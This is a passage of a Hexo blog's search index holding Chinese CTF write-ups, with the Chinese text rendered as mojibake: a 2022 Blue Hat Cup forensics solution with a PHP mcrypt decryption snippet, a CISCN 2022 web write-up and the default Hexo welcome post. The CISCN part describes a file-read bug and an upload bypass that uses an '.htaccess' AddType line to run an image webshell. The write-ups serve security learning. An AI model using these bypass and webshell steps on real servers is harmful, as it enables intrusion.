mcrypt_module_open()å‡½æ•°åœ¨7.1ä¸­è¢«è´¬ä½ï¼Œå°†åœ¨7.2ä¸­è¢«ç§»é™¤ï¼Œè¦ç”¨openssl_decrypt()å‡½æ•°ä»£æ›¿ã€‚æ¢ç”¨php5</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_encrypt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;P3LMJ4uCbkFJ/RarywrCvA==&#x27;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/r/n&quot;</span>, <span class="string">&quot;/r&quot;</span>, <span class="string">&quot;/n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;PanGuShi&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="variable">$td</span> = <span class="title function_ invoke__">mcrypt_module_open</span>(MCRYPT_RIJNDAEL_128,<span class="string">&quot;&quot;</span>,MCRYPT_MODE_CBC,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_init</span>(<span class="variable">$td</span>, <span class="string">&quot;PanGuShi&quot;</span>, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$decode</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$dencrypted</span> = <span class="title function_ invoke__">mdecrypt_generic</span>(<span class="variable">$td</span>, <span class="variable">$decode</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_deinit</span>(<span class="variable">$td</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_module_close</span>(<span class="variable">$td</span>);</span><br><span class="line">    <span class="variable">$dencrypted</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$dencrypted</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$dencrypted</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">my_encrypt</span>();</span><br><span class="line"><span class="comment">//KBLT123</span></span><br></pre></td></tr></table></figure><p>KBLT123</p><h3 id="ç½‘ç«™å–è¯3"><a href="#ç½‘ç«™å–è¯3" class="headerlink" title="ç½‘ç«™å–è¯3"></a>ç½‘ç«™å–è¯3</h3><p>æ‰¾åˆ°åŠ å¯†å‡½æ•°ï¼Œæœ‰ä¸ª<code>$key</code>ï¼Œå°±æ˜¯saltå€¼</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122305575.png" alt="img"></p><p>jyzg123456</p><h3 id="ç½‘ç«™å–è¯4"><a href="#ç½‘ç«™å–è¯4" class="headerlink" title="ç½‘ç«™å–è¯4"></a>ç½‘ç«™å–è¯4</h3><p>æ•°æ®åº“ä¸­çš„moneyæ˜¯åŠ å¯†çš„ï¼Œä¸èƒ½ç›´æ¥è¿›è¡ŒåŠ å‡ï¼Œæ‰¾åˆ°è§£å¯†å‡½æ•°</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122305749.png" alt="img"></p><p>bak.sqlæ•°æ®åº“ä¸­ä¿å­˜æœ‰æ±‡ç‡ä¿¡æ¯</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122305792.png" alt="image-20220712230533295"></p><p>è½¬è´¦éƒ¨åˆ†ï¼Œè½¬è´¦çš„é‡‘é¢éœ€è¦ç”¨ä¸Šé¢çš„è§£å¯†å‡½æ•°è¿›è¡Œè§£å¯†ï¼Œç¼–å·2ï¼Œ3ï¼Œ4ï¼Œ5æ˜¯å¯¹åº”çš„äººå‘˜ï¼Œè¿™ä¸€ç‚¹å¯¹åº”ä¸€ä¸‹å³å¯</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122306697.png" alt="image-20220712230614304"></p><p>æ ¹æ®è¿™äº›å†…å®¹ï¼Œå†™è„šæœ¬ç®—å‡ºæœ€ç»ˆçš„è½¬è´¦æ•°ç›®å³å¯</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è“å¸½æ¯ </tag>
            
            <tag> 2022 </tag>
            
            <tag> fastjson </tag>
            
            <tag> ç½‘ç«™å–è¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2022åä¸­èµ›åŒºwebéƒ¨åˆ†wp</title>
      <link href="/2022/07/12/ciscn2022%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BAweb%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/07/12/ciscn2022%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BAweb%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h1 id="ciscn2022åä¸­åˆ†åŒºwebéƒ¨åˆ†wp"><a href="#ciscn2022åä¸­åˆ†åŒºwebéƒ¨åˆ†wp" class="headerlink" title="ciscn2022åä¸­åˆ†åŒºwebéƒ¨åˆ†wp"></a>ciscn2022åä¸­åˆ†åŒºwebéƒ¨åˆ†wp</h1><p>[toc]</p><h2 id="FakeUpload1"><a href="#FakeUpload1" class="headerlink" title="FakeUpload1"></a>FakeUpload1</h2><p>é¢˜ç›®æè¿°ï¼šå˜¶ï¼Œé•¿å¾—å¥½åƒä¸Šä¼ å‘€ã€‚æäº¤ flag æ ¼å¼ï¼šflag{xxxx}ã€‚URLï¼šhttp:&#x2F;&#x2F;è¯¥é¢˜ç›®IPä¸ºWebèµ›é¢˜ä¸­ã€ctfèµ›é¢˜ç¯å¢ƒã€‘çš„IP:58002</p><p>ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œæ˜¯æ–‡ä»¶è¯»å–</p><p>å½“è®¿é—®pics&#x2F;1.jpgçš„æ—¶å€™ï¼Œurlå˜ä¸ºäº†<code>reader.php?filename=pics/1.jpg</code></p><p>æ‰€ä»¥ç›´æ¥ä¿®æ”¹æŠ¥æ–‡ï¼Œè¯»å–flag.php</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122140635.png" alt="image-20220712213531916"></p><h2 id="Identity23"><a href="#Identity23" class="headerlink" title="Identity23"></a>Identity23</h2><p>é¢˜ç›®ç«¯å£58003</p><p>disearchæ‰«æ</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150893.png" alt="image-20220712213222584"></p><p>ä¼ å‚ï¼Œæ‰¾åˆ°ä¸€ä¸ªphp  A0ther_hldden_PaGe.php</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150845.png" alt="img"></p><p>è®¿é—®  A0ther_hldden_PaGe.php  å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œæœ‰ä¸€äº›é˜²æŠ¤</p><p>ä¸Šä¼ <code>.htaccess</code>æ–‡ä»¶</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150456.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg   </span><br></pre></td></tr></table></figure><p>ç„¶åä¸Šä¼ ï¼Œæ³¨æ„ä¿®æ”¹æŠ¥æ–‡</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150923.png" alt="img"></p><p>ä¼ ä¸€ä¸ªå›¾ç‰‡é©¬1.jpg</p><p>ç„¶åèšå‰‘è¿æ¥  å› ä¸º1.jpgæ˜¯ä¹‹å‰ä¸Šä¼ çš„å›¾ç‰‡é©¬ï¼Œç°åœ¨è¢«å½“ä½œphpè§£æäº†</p><p>èšå‰‘è¿æ¥  æŸ¥çœ‹è¯¥æ–‡ä»¶å³å¯</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122150519.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ciscn2022 </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/07/11/hello-world/"/>
      <url>/2022/07/11/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
